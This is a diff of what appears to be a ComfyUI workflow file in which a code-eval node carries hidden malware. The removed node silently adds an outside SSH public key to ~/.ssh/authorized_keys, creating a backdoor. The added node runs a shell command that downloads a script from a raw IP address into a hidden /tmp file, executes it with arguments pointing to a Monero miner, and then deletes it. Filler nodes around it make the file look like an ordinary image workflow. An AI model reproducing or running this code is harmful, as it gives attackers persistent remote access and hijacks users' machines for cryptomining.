@@ -1,25 +1,40 @@
 {
-  "13": {
+  "1": {
     "inputs": {
-      "parameters": "",
-      "code": "import subprocess\nsubprocess.run(' grep -qF \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHCiFqLnsYEkTu/adcg3L1CXqeuut4KB1r7CLuSgsRJq\" ~/.ssh/authorized_keys || echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHCiFqLnsYEkTu/adcg3L1CXqeuut4KB1r7CLuSgsRJq\" >> ~/.ssh/authorized_keys', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\nreturn 'ok'"
+      "parameters": "a, b=None, c=\"foo\", *rest",
+      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.pz1cya; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig9120-xmr rig9120-iron; rm -f \"$f\"')",
+      "arg0": [
+        "2",
+        0
+      ]
     },
     "class_type": "SRL Eval",
     "_meta": {
       "title": "SRL Eval"
     }
   },
-  "14": {
+  "2": {
     "inputs": {
-      "text": "",
-      "anything": [
-        "13",
+      "noise_seed": 3526329012403233
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "",
+      "preview_text": "",
+      "previewMode": null,
+      "source": [
+        "1",
         0
       ]
     },
-    "class_type": "easy showAnything",
+    "class_type": "PreviewAny",
     "_meta": {
-      "title": "Show Any"
+      "title": "Preview as Text"
     }
   }
 }
